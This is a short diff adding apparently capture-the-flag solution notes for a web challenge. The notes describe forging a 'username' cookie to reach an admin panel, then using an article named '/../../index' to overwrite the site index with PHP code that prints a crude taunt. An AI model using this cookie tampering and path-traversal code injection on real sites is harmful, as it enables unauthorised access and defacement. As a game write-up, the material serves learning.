@@ -1,0 +1,8 @@
+there is a username cookie. change the value to Hydra_K and you can access the admin panel
+
+create an article called /../../index
+<?php
+echo "suck my balls hydra";
+?>
+
+you win
